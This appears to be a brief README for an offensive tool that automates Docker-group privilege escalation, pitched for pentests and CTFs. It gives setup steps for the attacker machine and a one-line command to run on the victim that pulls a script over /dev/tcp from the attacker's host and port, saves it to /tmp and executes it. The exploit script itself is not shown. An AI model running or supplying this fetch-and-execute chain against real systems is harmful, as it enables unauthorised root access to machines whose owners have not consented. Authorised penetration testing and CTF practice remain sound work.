# Docker Exploit Automation

Docker group permission escalation Automated, usually for pentesting.
Usually, I use this script in Pentest or CTFs.

Docker **not needed in ATTACKER MACHINE**, and the internet connection **not needed in VICTIM MACHINE!!**
Coool, right **;)**

## In attacker machine:

    $ bash ./setup.sh

Or:

    $ chmod +x setup.sh
    	$ ./setup.sh

Copy the Instractions like this one and RUN IT in your victim machine:

    bash -c \"cat < /dev/tcp/$LHOST/$LPORT > /tmp/docker-exploit.sh\"; bash /tmp/docker-exploit.sh
